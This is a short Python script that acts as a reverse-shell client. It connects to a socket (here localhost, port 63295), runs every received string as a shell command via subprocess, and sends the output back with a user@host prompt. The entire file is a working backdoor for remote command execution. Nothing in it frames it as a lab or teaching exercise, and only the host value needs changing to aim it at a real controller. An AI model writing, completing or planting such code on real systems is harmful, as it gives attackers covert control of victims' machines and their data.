import os
import socket
import subprocess
import sys
import getpass

s = socket.socket()
host = 'localhost'
port = 63295
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        if 'lin' in  sys.platform:
            prefix = getpass.getuser() + "@" + socket.gethostname() + ":"
            s.send(str.encode(output_str + prefix + str(os.getcwd()) + '# '))
        else:
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))

# Close connection
s.close()
